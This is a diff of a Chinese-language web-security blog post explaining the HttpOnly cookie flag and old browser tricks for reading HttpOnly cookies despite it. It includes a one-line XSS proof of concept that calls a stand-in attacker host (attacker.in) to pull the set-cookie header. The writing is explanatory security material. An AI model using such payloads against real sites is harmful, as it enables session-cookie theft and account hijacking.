@@ -10,8 +10,11 @@ tags: ["websecurity","xss"]
 
 ### HttpOnly简介
 故名思议，`HttpOnly`是指仅在`HTTP`层面上传输的`Cookie`，当设置了`HttpOnly`标志后，客户端脚本就无法读写该`Cookie`，这样能有效的防御`XSS`攻击。`HttpOnly`是由微软在`2002`年首先在`Internet Explorer 6 SP1`上实现。根据微软的[描述](http://msdn2.microsoft.com/en-us/library/ms533046.aspx)，`HttpOnly`是`HTTP Set-Cookie`头中的一个附加标志，下面的例子就是一个头信息中设置了`HttpOnly Cookie`。
+    
     Set-Cookie: USER=123; expires=Wednesday, 09-Nov-99 23:12:40 GMT; HttpOnly
+
 目前，基本上所有的浏览器和web框架都支持`HttpOnly`。
+
 <!--more-->
 
 ### 得到HttpOnly Cookie
@@ -28,6 +31,7 @@ tags: ["websecurity","xss"]
 `Firefox <= 1.9.1`在处理`HttpOnly Cookies`时存在bug，通过`getResponseHeader()`得不到`HttpOnly Cookie`，但是通过`getAllResponseHeaders()`可以得到。
 ##### Java getHeaderField
 POC:
+
     alert(new java.net.URL('http://attacker.in/xss/cookie.php').openConnection().getHeaderField('set-cookie'));
 
 ### 参考
